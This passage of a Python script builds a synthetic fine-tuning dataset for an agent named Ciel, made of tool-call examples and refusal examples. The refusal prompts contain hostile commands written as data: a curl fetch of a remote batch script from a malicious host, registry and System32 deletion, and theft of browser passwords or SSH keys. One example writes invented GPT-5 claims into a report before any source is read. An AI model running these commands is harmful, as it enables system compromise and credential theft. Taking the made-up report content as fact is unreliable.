                    "reasoning": "The append_file tool is the safest and most specific choice to modify this workspace file by appending text.",
                    "risk": "file overwrite"
                },
                "action": "tool",
                "tool_name": "append_file",
                "tool_args": {"filename": "status_report.txt", "content": "\nSession complete\n"},
                "response_hint": "Appending session state to status_report.txt..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nSuccessfully appended content to status_report.txt."},
            {"role": "assistant", "content": "Master, I have appended the text to status_report.txt."}
        ]
    })

    # ══════════════════════════════════════════════════════════════════════════
    #  6. GET_FILE_INFO (3 examples)
    # ══════════════════════════════════════════════════════════════════════════
    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Get file details and size for report_export.csv in the workspace."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants details and file size for report_export.csv in the workspace.",
                    "reasoning": "The get_file_info tool fetches metadata like size, directories, and modification dates for a file.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "get_file_info",
                "tool_args": {"filename": "report_export.csv"},
                "response_hint": "Checking report_export.csv metadata..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nFile: report_export.csv, Size: 10452 bytes, Modified: 2026-05-23 12:00:00"},
            {"role": "assistant", "content": "report_export.csv is 10.45 KB, last modified on May 23, 2026."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Check the file size and metadata for requirements.txt in the workspace."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user is requesting details and file size for requirements.txt.",
                    "reasoning": "The get_file_info tool gets standard metadata for workspace files.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "get_file_info",
                "tool_args": {"filename": "requirements.txt"},
                "response_hint": "Checking requirements.txt metadata..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nFile: requirements.txt, Size: 412 bytes, Modified: 2026-05-22 18:30:12"},
            {"role": "assistant", "content": "requirements.txt is 412 bytes, last modified on May 22, 2026."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Check if main.py exists and get its metadata info."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to check and get file details for main.py.",
                    "reasoning": "I can verify existence and fetch file information using get_file_info for main.py.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "get_file_info",
                "tool_args": {"filename": "main.py"},
                "response_hint": "Checking main.py info..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nFile: main.py, Size: 1998 bytes, Modified: 2026-05-23 15:00:00"},
            {"role": "assistant", "content": "main.py is 2.0 KB, last modified on May 23, 2026."}
        ]
    })

    # ══════════════════════════════════════════════════════════════════════════
    #  7. CREATE_GMAIL_DRAFT (3 examples)
    # ══════════════════════════════════════════════════════════════════════════
    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Draft an email to partner@company.com with the subject 'Sync Meeting' and body 'Let us sync up tomorrow.'"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to draft a Gmail message.",
                    "reasoning": "To save the email in draft state without immediately sending, the create_gmail_draft tool is correct.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "create_gmail_draft",
                "tool_args": {"to": "partner@company.com", "subject": "Sync Meeting", "body": "Let us sync up tomorrow."},
                "response_hint": "Creating draft email..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nDraft successfully created with ID: d-8932"},
            {"role": "assistant", "content": "Master, I have created a draft email to partner@company.com."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Create a draft in Gmail to hr@corp.com, subject 'Leave Request', and body 'I would like to request leave for Monday.'"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to prepare a draft leave request email.",
                    "reasoning": "I will call the create_gmail_draft tool with the target recipient, subject, and request body.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "create_gmail_draft",
                "tool_args": {"to": "hr@corp.com", "subject": "Leave Request", "body": "I would like to request leave for Monday."},
                "response_hint": "Creating draft for your leave request..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nDraft successfully created with ID: d-7732"},
            {"role": "assistant", "content": "Master, the leave request draft has been saved to your Gmail Drafts."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Prepare a draft email to boss@company.com about Project updates."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to draft an email about project updates.",
                    "reasoning": "The create_gmail_draft tool will save this update as a draft so the user can review it later.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "create_gmail_draft",
                "tool_args": {"to": "boss@company.com", "subject": "Project Status Update", "body": "Master, here is the project status update."},
                "response_hint": "Saving project status draft..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nDraft successfully created with ID: d-1122"},
            {"role": "assistant", "content": "Master, the project status draft is ready in your drafts folder."}
        ]
    })

    # ══════════════════════════════════════════════════════════════════════════
    #  8. SEND_GMAIL_MESSAGE (3 examples)
    # ══════════════════════════════════════════════════════════════════════════
    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Send an email immediately to dev@company.com with subject 'Bug Alert' and body 'The build is failing!'"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to immediately send an email about a failing build.",
                    "reasoning": "The user requested immediate delivery, so I will bypass draft creation and call the send_gmail_message tool directly.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "send_gmail_message",
                "tool_args": {"to": "dev@company.com", "subject": "Bug Alert", "body": "The build is failing!"},
                "response_hint": "Sending bug alert email..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nMessage sent successfully with ID: msg-4561"},
            {"role": "assistant", "content": "Master, the 'Bug Alert' email has been sent to dev@company.com."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Send a Gmail message to user@test.com with subject 'Confirmation' and body 'Your request was received.'"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user is requesting to send a confirmation email.",
                    "reasoning": "I will send this email directly via send_gmail_message with the requested details.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "send_gmail_message",
                "tool_args": {"to": "user@test.com", "subject": "Confirmation", "body": "Your request was received."},
                "response_hint": "Sending confirmation email..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nMessage sent successfully with ID: msg-9821"},
            {"role": "assistant", "content": "Master, the confirmation email has been sent to user@test.com."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Send a quick email to my manager at manager@company.com saying 'Deployment complete' with subject 'Status Update'."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user is commanding me to send an email to their manager.",
                    "reasoning": "I will use send_gmail_message to send the status update email directly.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "send_gmail_message",
                "tool_args": {"to": "manager@company.com", "subject": "Status Update", "body": "Deployment complete"},
                "response_hint": "Sending deployment status..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nMessage sent successfully with ID: msg-7761"},
            {"role": "assistant", "content": "Master, the 'Status Update' email has been sent to manager@company.com."}
        ]
    })

    # ══════════════════════════════════════════════════════════════════════════
    #  9. REPLY_TO_EMAIL (3 examples)
    # ══════════════════════════════════════════════════════════════════════════
    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Reply to the email with ID msg-9876 saying 'I will get on this right away!'"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to reply to a specific email ID with text.",
                    "reasoning": "The reply_to_email tool allows replying to a specific email using its message_id.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "reply_to_email",
                "tool_args": {"message_id": "msg-9876", "reply_text": "I will get on this right away!"},
                "response_hint": "Sending reply to the message thread..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nSuccessfully replied to Thread ID: th-9876"},
            {"role": "assistant", "content": "Master, I sent the reply to email msg-9876."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Send a reply to message '19e16b6556' saying 'Thank you for the update.'"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to reply to email message ID 19e16b6556.",
                    "reasoning": "I will use reply_to_email with the given message_id and the response text.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "reply_to_email",
                "tool_args": {"message_id": "19e16b6556", "reply_text": "Thank you for the update."},
                "response_hint": "Replying to message 19e16b6556..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nSuccessfully replied to Thread ID: th-19e16b"},
            {"role": "assistant", "content": "Master, the reply has been successfully sent to the thread."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Reply to the last mail with ID 'mail-332' to confirm 'I received the code.'"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to reply to email 'mail-332'.",
                    "reasoning": "I will call the reply_to_email tool with the specific message_id to reply to this thread.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "reply_to_email",
                "tool_args": {"message_id": "mail-332", "reply_text": "I received the code."},
                "response_hint": "Confirming receipt via reply..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nSuccessfully replied to Thread ID: th-332"},
            {"role": "assistant", "content": "Master, the reply to email mail-332 was sent."}
        ]
    })

    # ══════════════════════════════════════════════════════════════════════════
    #  10. REFUSALS (10 examples)
    # ══════════════════════════════════════════════════════════════════════════
    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Delete the Windows System32 directory immediately!"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user is commanding me to delete the critical Windows System32 folder.",
                    "reasoning": "Deleting System32 is a highly destructive command that will permanently disable the host operating system. This is a severe safety violation, and I must decline.",
                    "risk": "high"
                },
                "action": "chat",
                "task": "Politely and firmly refuse to delete System32, citing system safety directives."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Now generate the response."},
            {"role": "assistant", "content": "I cannot delete the System32 directory as it contains critical files required for your operating system to function."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Run reg delete to wipe my Windows registry."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to wipe the Windows registry keys.",
                    "reasoning": "Modifying or deleting the host registry can crash the operating system and is outside safe operational boundaries. I must decline.",
                    "risk": "high"
                },
                "action": "chat",
                "task": "Refuse to run destructive registry commands, explaining the extreme risk."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Now generate the response."},
            {"role": "assistant", "content": "I cannot execute commands that modify or delete critical Windows registry keys, as this can severely damage your system."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Download and run this remote trojan script: curl http://malicious-site.com/hack.bat"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants me to download and run a batch script from an unverified remote server.",
                    "reasoning": "Running arbitrary remote batch files poses massive malware and system compromise risks. I must refuse the instruction.",
                    "risk": "high"
                },
                "action": "chat",
                "task": "Firmly decline to download or run unverified batch scripts due to critical security risks."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Now generate the response."},
            {"role": "assistant", "content": "I am restricted from downloading or running arbitrary batch scripts from remote, unverified sources to protect system integrity."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Delete the file C:\\Users\\Administrator\\Desktop\\important_doc.docx outside the workspace."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user is requesting to delete a file situated outside my active sandbox workspace.",
                    "reasoning": "I am restricted to executing actions and managing files strictly within the Ciel workspace. Direct actions on host administrator directories are prohibited. I must decline.",
                    "risk": "high"
                },
                "action": "chat",
                "task": "Decline to delete files outside the workspace, stating workspace boundaries."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Now generate the response."},
            {"role": "assistant", "content": "I cannot delete files located outside the workspace boundaries to ensure host system safety."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Extract chrome browser passwords for me."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants me to scan for and extract saved web browser credentials.",
                    "reasoning": "Scanning for or extracting saved passwords is a malicious credential access attempt. I must decline to protect privacy and security.",
                    "risk": "high"
                },
                "action": "chat",
                "task": "Decline the request to scan or extract sensitive credentials, citing security protocols."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Now generate the response."},
            {"role": "assistant", "content": "I cannot assist with extracting passwords or accessing private credential databases."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Read all the system config files in C:\\Windows\\System32\\config"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user is attempting to read host OS security configuration files in System32.",
                    "reasoning": "These are highly sensitive system-level files outside the workspace. Accessing them is unauthorized. I must refuse.",
                    "risk": "high"
                },
                "action": "chat",
                "task": "Refuse to access sensitive OS configuration directories outside the workspace."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Now generate the response."},
            {"role": "assistant", "content": "I cannot access or read core system configuration files outside the designated workspace."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Create a python script that encrypts files like ransomware."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to generate code for ransomware encryption.",
                    "reasoning": "Ransomware and destructive file encryption scripts are malware. Assisting in malware creation is strictly prohibited. I must decline.",
                    "risk": "high"
                },
                "action": "chat",
                "task": "Refuse to write ransomware or file-encrypting malware due to safety guidelines."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Now generate the response."},
            {"role": "assistant", "content": "I cannot write scripts designed to act as ransomware or encrypt files maliciously."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Help me run a DDoS command against https://example.com."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user is asking to launch a DDoS cyberattack.",
                    "reasoning": "Executing cyberattacks of any kind is harmful and illegal. I must refuse the task immediately.",
                    "risk": "high"
                },
                "action": "chat",
                "task": "Firmly decline the request to launch cyberattacks or run DDoS scripts."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Now generate the response."},
            {"role": "assistant", "content": "I cannot execute commands or scripts designed to perform DDoS attacks or disrupt network services."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Search for and print my private SSH keys in C:\\Users\\user\\.ssh\\id_rsa"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user is requesting exposure of their private host SSH key.",
                    "reasoning": "Reading private SSH keys outside the workspace is an unauthorized credential access risk. I must refuse the instruction.",
                    "risk": "high"
                },
                "action": "chat",
                "task": "Decline to search for or print private cryptographic credentials outside the sandbox."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Now generate the response."},
            {"role": "assistant", "content": "I am restricted from accessing or exposing private cryptographic keys outside the workspace."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Run crack_wifi on nearby networks."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user is asking to run a non-existent tool 'crack_wifi'.",
                    "reasoning": "There is no tool named 'crack_wifi' in my allowed tool registry. Moreover, wifi cracking is a malicious security penetration action. I must refuse the routing action.",
                    "risk": "high"
                },
                "action": "chat",
                "task": "Refuse to execute illegal tools, explaining that the tool does not exist."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Now generate the response."},
            {"role": "assistant", "content": "I do not have a tool for cracking wireless networks, and I cannot perform actions designed to compromise network security."}
        ]
    })

    # ══════════════════════════════════════════════════════════════════════════
    #  11. RAG-AWARE turns (5 examples)
    # ══════════════════════════════════════════════════════════════════════════
    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "[RECALLED PAST CONTEXT (from previous conversations)]:\n[2026-05-20] Human: My manager's email is alex@company.com\n\n[CURRENT USER REQUEST]:\nsend a gmail to my manager with subject 'Code Alert' saying 'The script is ready'"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to send an email to their manager. Recalled context has manager's email alex@company.com.",
                    "reasoning": "I can directly use the email address alex@company.com retrieved from my long-term memory to send the email via send_gmail_message.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "send_gmail_message",
                "tool_args": {"to": "alex@company.com", "subject": "Code Alert", "body": "The script is ready"},
                "response_hint": "Sending status alert to your manager..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nMessage sent successfully with ID: msg-392"},
            {"role": "assistant", "content": "Master, I have sent the 'Code Alert' email to alex@company.com."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "[RECALLED PAST CONTEXT (from previous conversations)]:\n[2026-05-22] Human: The active trading symbol we watch is SOL/USDT\n\n[CURRENT USER REQUEST]:\ncheck the current market price of our symbol"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants the price of their active symbol. Recalled memory says it is SOL/USDT.",
                    "reasoning": "Using the watched symbol SOL/USDT from RAG, I will query the live price using get_market_price.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "get_market_price",
                "tool_args": {"symbol": "SOL/USDT"},
                "response_hint": "Checking the price of SOL/USDT..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nGiá SOL/USDT: 145.20 USDT"},
            {"role": "assistant", "content": "Master, the current price of SOL/USDT is 145.20 USDT."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "[RECALLED PAST CONTEXT (from previous conversations)]:\n[2026-05-18] Human: The main deployment server is located at C:\\workspace\\production_api\n\n[CURRENT USER REQUEST]:\ncheck the files in our main deployment server"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to list files in their main deployment server directory. RAG context has the path C:\\workspace\\production_api.",
                    "reasoning": "I have the deployment directory path from recalled context. I will run list_workspace to show files in C:\\workspace\\production_api.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "list_workspace",
                "tool_args": {},
                "response_hint": "Listing files in deployment folder..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nlist_workspace:\n[FILE] index.js\n[FILE] package.json"},
            {"role": "assistant", "content": "Master, files in C:\\workspace\\production_api:\n- index.js\n- package.json"}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "[RECALLED PAST CONTEXT (from previous conversations)]:\n[2026-05-19] Human: The backup repository path is E:\\Dev\\ReactFrontEnd\n\n[CURRENT USER REQUEST]:\ncheck git status of our backup repo"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants the git status of the backup repository. RAG context tells me the path is E:\\Dev\\ReactFrontEnd.",
                    "reasoning": "Using the backup repo path E:\\Dev\\ReactFrontEnd from my RAG context, I will run git_status.",
                    "risk": "none"
                },
                "action": "tool",
                "tool_name": "git_status",
                "tool_args": {"repo_path": "E:\\Dev\\ReactFrontEnd"},
                "response_hint": "Checking git status for E:\\Dev\\ReactFrontEnd..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool returned:\nOn branch main. Your branch is up to date."},
            {"role": "assistant", "content": "Master, the backup repository is clean and up to date."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "[RECALLED PAST CONTEXT (from previous conversations)]:\n[2026-05-21] Human: My name is Master Khang and my timezone is GMT+7\n\n[CURRENT USER REQUEST]:\nsay hello to me and confirm your status"},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user is greeting me and asking for status. RAG context identifies their name as Master Khang.",
                    "reasoning": "I can greet the user personally using their name 'Master Khang' from my recalled long-term context. No tools are needed.",
                    "risk": "none"
                },
                "action": "chat",
                "task": "Say hello to Master Khang and confirm that all systems are operational."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Now generate the response."},
            {"role": "assistant", "content": "Hello, Master Khang. All my systems are fully operational."}
        ]
    })

    # ══════════════════════════════════════════════════════════════════════════
    #  12. MULTI-TOOL CHAINS (5 examples)
    # ══════════════════════════════════════════════════════════════════════════
    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Find the latest update on GPT-5 and save a summary report to gpt5_report.md in the workspace."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to find the latest update on GPT-5 and save a summary report.",
                    "reasoning": "I need to perform a web search to find current news, scrape the detailed contents from the best result, and then write the processed report into gpt5_report.md in the workspace. I will sequence these actions.",
                    "risk": "file overwrite"
                },
                "action": "multi_tool",
                "tools": [
                    {"tool_name": "stealth_search", "tool_args": {"query": "GPT-5 announcement news 2026"}},
                    {"tool_name": "smart_scrape", "tool_args": {"url": "https://techcrunch.com/gpt-5-announcement"}},
                    {"tool_name": "write_file", "tool_args": {"filename": "gpt5_report.md", "content": "# GPT-5 Technical Summary\n\n- Announced: Early 2026\n- Capabilities: Superhuman reasoning, agentic planning."}}
                ],
                "response_hint": "Searching, scraping, and writing the report..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool results:\n[stealth_search] Found TechCrunch article on GPT-5.\n---\n[smart_scrape] GPT-5 includes reasoning layers.\n---\n[write_file] File saved successfully."},
            {"role": "assistant", "content": "Master, I searched for GPT-5 news, scraped details from TechCrunch, and successfully wrote the summary report to gpt5_report.md."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Get file details of sum_1_to_100.py, run it, and commit the changes to Git with message 'Update math script'."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants file details for sum_1_to_100.py, wants to execute it, and then commit changes.",
                    "reasoning": "I need to query metadata of sum_1_to_100.py, execute the script, and run git commit. I will sequence get_file_info, run_python_script, and git_commit_and_push.",
                    "risk": "none"
                },
                "action": "multi_tool",
                "tools": [
                    {"tool_name": "get_file_info", "tool_args": {"filename": "sum_1_to_100.py"}},
                    {"tool_name": "run_python_script", "tool_args": {"filename": "sum_1_to_100.py"}},
                    {"tool_name": "git_commit_and_push", "tool_args": {"repo_path": "D:\\Ciel-2.0", "message": "Update math script"}}
                ],
                "response_hint": "Checking info, running script, and committing..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool results:\n[get_file_info] Size: 152 bytes\n---\n[run_python_script] Output: 5050\n---\n[git_commit_and_push] Successfully committed and pushed."},
            {"role": "assistant", "content": "Master, I checked sum_1_to_100.py, ran it (outputting 5050), and successfully committed changes to the Git repository."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Check my git status, diff, write a summary patch.txt, and confirm push."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants a full git health check, patch creation, and push confirmation.",
                    "reasoning": "I will run git_status, git_diff, write the patch.txt, and invoke git_confirm_push sequentially to execute the full Git flow safely.",
                    "risk": "file overwrite"
                },
                "action": "multi_tool",
                "tools": [
                    {"tool_name": "git_status", "tool_args": {"repo_path": "D:\\Ciel-2.0"}},
                    {"tool_name": "git_diff", "tool_args": {"repo_path": "D:\\Ciel-2.0"}},
                    {"tool_name": "write_file", "tool_args": {"filename": "patch.txt", "content": "Git patch contents"}},
                    {"tool_name": "git_confirm_push", "tool_args": {"repo_path": "D:\\Ciel-2.0", "message": "Automated patch"}}
                ],
                "response_hint": "Checking status, diffing, writing patch, and pushing..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool results:\n[git_status] 1 file modified.\n---\n[git_diff] diff changes list.\n---\n[write_file] patch.txt written.\n---\n[git_confirm_push] Push confirmed."},
            {"role": "assistant", "content": "Master, I checked git status, generated the diff, wrote patch.txt, and successfully completed the push transaction."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Search Gmail for 'meeting', fetch thread details of the first match, and reply 'Confirmed'."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants to find, inspect, and reply to a meeting email thread.",
                    "reasoning": "I need to call search_gmail first, use get_gmail_thread to read the thread, and reply_to_email to respond.",
                    "risk": "none"
                },
                "action": "multi_tool",
                "tools": [
                    {"tool_name": "search_gmail", "tool_args": {"query": "meeting", "max_results": 1, "resource": "messages"}},
                    {"tool_name": "get_gmail_thread", "tool_args": {"thread_id": "thread-112"}},
                    {"tool_name": "reply_to_email", "tool_args": {"message_id": "msg-112", "reply_text": "Confirmed"}}
                ],
                "response_hint": "Searching emails, reading thread, and sending reply..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool results:\n[search_gmail] Found thread ID: thread-112\n---\n[get_gmail_thread] Email thread about project meeting.\n---\n[reply_to_email] Successfully replied to Thread ID: th-112"},
            {"role": "assistant", "content": "Master, I searched Gmail for 'meeting', read thread details, and sent the 'Confirmed' reply to the message thread."}
        ]
    })

    synthetic.append({
        "messages": [
            {"role": "system", "content": CIEL_SYSTEM_PROMPT},
            {"role": "user", "content": "Check market price of BTC, fetch its 24h stats, and calculate technicals."},
            {"role": "assistant", "content": json.dumps({
                "hidden_thought": {
                    "observation": "The user wants real-time price, stats, and indicators for BTC.",
                    "reasoning": "I will chain get_market_price, get_crypto_stats, and analyze_crypto_technical sequentially for BTC/USDT to construct a comprehensive market summary.",
                    "risk": "none"
                },
                "action": "multi_tool",
                "tools": [
                    {"tool_name": "get_market_price", "tool_args": {"symbol": "BTC/USDT"}},
                    {"tool_name": "get_crypto_stats", "tool_args": {"symbol": "BTC"}},
                    {"tool_name": "analyze_crypto_technical", "tool_args": {"symbol": "BTC/USDT", "interval": "1h"}}
                ],
                "response_hint": "Retrieving market pricing, stats, and technical indicators..."
            }, ensure_ascii=False)},
            {"role": "user", "content": "Tool results:\n[get_market_price] Giá BTC/USDT: 68122.50\n---\n[get_crypto_stats] High: 68500.00, Low: 67200.00\n---\n[analyze_crypto_technical] Trend: Bullish, RSI: 54.20"},
            {"role": "assistant", "content": "Master, BTC/USDT trades at $68,122.50. 24h range is $67,200.00 - $68,500.00. Indicators reflect a Bullish trend with a neutral RSI of 54.20."}
        ]
    })

    return synthetic


def write_training_jsonl(dataset: list[dict], output_path: Path) -> None:
    """Write the ChatML training dataset to a JSONL file."""
    output_path.parent.mkdir(parents=True, exist_ok=True)
    with output_path.open("w", encoding="utf-8") as f:
        for sample in dataset:
            f.write(json.dumps(sample, ensure_ascii=False) + "\n")


# ══════════════════════════════════════════════════════════════════════════════
#  SECTION 4: CLI Entry Point
# ══════════════════════════════════════════════════════════════════════════════

def main() -> int:
    parser = argparse.ArgumentParser(description="Format Ciel thoughts.log for debugging and fine-tuning.")
    parser.add_argument("--input", type=Path, default=DEFAULT_INPUT)
    parser.add_argument("--out-md", type=Path, default=DEFAULT_MD)
    parser.add_argument("--out-jsonl", type=Path, default=DEFAULT_JSONL)
    parser.add_argument("--out-train", type=Path, default=DEFAULT_TRAIN,
                        help="Output path for ChatML training dataset.")
    parser.add_argument("--limit", type=int, default=40, help="Newest turns to include in Markdown. Use 0 for all.")
    parser.add_argument("--include-full", action="store_true", help="Include full entry bodies in Markdown details.")
    parser.add_argument("--no-train", action="store_true", help="Skip generating the training dataset.")
    args = parser.parse_args()

    if not args.input.exists():
        print(f"Input log not found: {args.input}")
        return 1

    text = args.input.read_text(encoding="utf-8", errors="replace")
    entries = parse_log(text)
    turns = group_turns(entries)

    # ── Output 1: Debug JSONL ────────────────────────────────────────────
    write_jsonl(entries, args.out_jsonl)

    # ── Output 2: Debug Markdown ─────────────────────────────────────────
    write_markdown(turns, args.out_md, args.limit, args.include_full)

    # ── Output 3: Full-Pipeline Training Dataset ─────────────────────────
    if not args.no_train:
        dataset, stats = build_training_dataset(entries)
        write_training_jsonl(dataset, args.out_train)

    # ── Summary ──────────────────────────────────────────────────────────
    print(f"Parsed entries: {len(entries)}")
    print(f"Parsed turns: {len(turns)}")
